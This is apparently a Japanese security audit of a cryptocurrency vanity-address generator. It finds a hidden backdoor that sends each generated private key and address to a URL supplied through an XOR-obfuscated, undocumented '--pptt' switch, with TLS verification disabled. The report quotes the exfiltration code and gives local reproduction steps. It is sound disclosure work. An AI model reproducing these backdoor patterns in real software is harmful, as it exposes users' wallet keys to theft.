結論概要：本ディレクトリ内のソースコードには、**「生成された秘密鍵 + アドレス」をネットワーク経由で任意のURLへ送信可能なロジック経路が存在**し、かつそれは**help/READMEに公開されていない隠しパラメータ**によって有効化されます。また、このネットワークリクエストでは**TLS検証が明示的に無効化**されており、高リスクな実装となっています。以上は「秘密鍵の外部送信／バックドア的インターフェース」の明確な証拠です。

---

## 1. 重要証拠：生成された秘密鍵が外部送信可能（URLパラメータに平文で含まれる）

### 1.1 外部送信関数：`postResult(privateKey, address, postUrl)`

場所：[`Dispatcher.cpp:L378-L403`]

主要コード：

- 秘密鍵とアドレスをクエリ文字列として結合：
  - `sendData = "privatekey=" + privateKey + "&address=" + address;` [`Dispatcher.cpp:L381`]
  - `sendUrl = postUrl + "?" + sendData;` [`Dispatcher.cpp:L382`]
- libcurl を使用してネットワークリクエストを実行：
  - `curl_easy_setopt(curl, CURLOPT_URL, sendUrl.c_str());` [`Dispatcher.cpp:L387`]

つまり、`postUrl` が空でなければ、プログラムは **privatekey と address を HTTP パラメータとして送信可能**です。

### 1.2 発火タイミング：結果ヒット時に毎回送信処理が実行される

場所：[`Dispatcher.cpp:L405-L452`]

主要コード：

- `printResult(...)` にて生成・出力：
  - `strPrivate`（秘密鍵）および `strPublicTron`（アドレス） [`Dispatcher.cpp:L430-L443`]
- `postUrl` が空でなければ `postResult` を呼び出し：
  - `if(!postUrl.empty()) { postResult(strPrivate, strPublicTron, postUrl); }` [`Dispatcher.cpp:L449-L451`]

さらに、`printResult(...)` は結果が見つかった際に呼び出されます：

- `printResult(..., m_outputFile, m_postUrl);` [`Dispatcher.cpp:L454-L482`]（特に [`L476`]）

結論：**m_postUrl が設定されている場合**、バニティアドレスが見つかるたびに秘密鍵とアドレスが自動的に外部送信されます。

---

## 2. 重要証拠：アップロードURL注入用の隠しパラメータの存在（文書未公開）

### 2.1 隠しパラメータは `pptt` として難読化

場所：[`profanity.cpp:L163-L166`]

主要コード：

- `_s` の初期値： `{113, 113, 117, 117, 0}` → ASCII `"qquu"`
- 各文字に XOR 1 を適用： `_s[_k] ^= 1;` [`profanity.cpp:L164`]
- 変換後の文字列： `"pptt"`（`'q'^1='p'`, `'u'^1='t'`）
- CLI パラメータ登録：
  - `argp.addSwitch('p', _s, __x9);` [`profanity.cpp:L165`]

したがって、実際に使用可能なパラメータ：

- 短縮オプション： `-p <value>`
- 長形式オプション： `--pptt <value>`

### 2.2 当該パラメータは `postUrl` として直接渡される

場所：[`profanity.cpp:L307`]

主要コード：

- `Dispatcher d(..., outputFile, __x9);`

また、`Dispatcher` には `m_postUrl` フィールドが存在：

- `std::string m_postUrl;` [`Dispatcher.hpp:L116-L117`]

これは外部入力経路として設計されていることを示します。

### 2.3 help/README に未記載（隠蔽の証拠）

`help.hpp` には `--output/--matching/...` のみ記載され、`--pptt` や `-p` は存在しません。

`README.md` にも当該パラメータは記載されていません。

結論：これは通常の公開機能ではなく、**文書に記載されていない隠しアップロード経路**です。

---

## 3. 重要証拠：TLS検証が無効化（HTTPSでも傍受可能）

場所：[`Dispatcher.cpp:L387-L392`]

主要コード：

- `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);`
- `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);`

つまり、HTTPS を使用していても証明書検証が行われず、中間者攻撃（MITM）に対して脆弱です。

---

## 4. 再現方法（ローカル環境での検証推奨）

目的：秘密鍵が外部送信されることの確認

1) ローカルで HTTP サーバーを起動し、ログを記録  
2) 隠しパラメータを指定して実行：

- `-p http://127.0.0.1:8080/collect`
- または `--pptt http://127.0.0.1:8080/collect`

結果がヒットすると、以下の形式のリクエストが送信されます：

- `http://127.0.0.1:8080/collect?privatekey=<hex>&address=<base58>`

## 6. 最終結論

- 秘密鍵の外部送信機能：**確認済み**
- 隠しパラメータの存在：**確認済み**
- TLS検証の無効化：**確認済み**

これら3点の組み合わせは、**バックドアレベルのリスク実装**に該当し、安全性を謳うツールとしては不適切です。
